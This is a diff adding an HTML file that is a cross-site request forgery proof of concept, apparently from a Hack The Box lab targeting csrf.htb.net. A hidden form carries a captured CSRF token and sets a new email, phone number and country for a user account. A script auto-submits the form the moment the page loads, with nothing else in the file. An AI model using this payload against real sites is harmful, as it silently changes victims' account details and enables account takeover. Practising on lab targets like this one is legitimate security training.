@@ -1,0 +1,15 @@
+<html>
+	<body>
+		<form id="submitme" action="http://csrf.htb.net/app/save/julie.rogers@example.com" method="GET">
+			<input type="hidden" name="email" value="HEEEY@tumama.com"/>
+			<input type="hidden" name="telephone" value="&#40;227&#41;&#45;750&#45;8112" />
+      			<input type="hidden" name="country" value="CSRF_POC" />
+      			<input type="hidden" name="action" value="save" />
+      			<input type="hidden" name="csrf" value="1e2a495f132ebd8874f648faadf06c7d87214351" />
+      			<input type="submit" value="Submit request" />
+    		</form>
+    		<script>
+      			document.getElementById("submitme").submit()
+    		</script>
+	</body>
+</html>
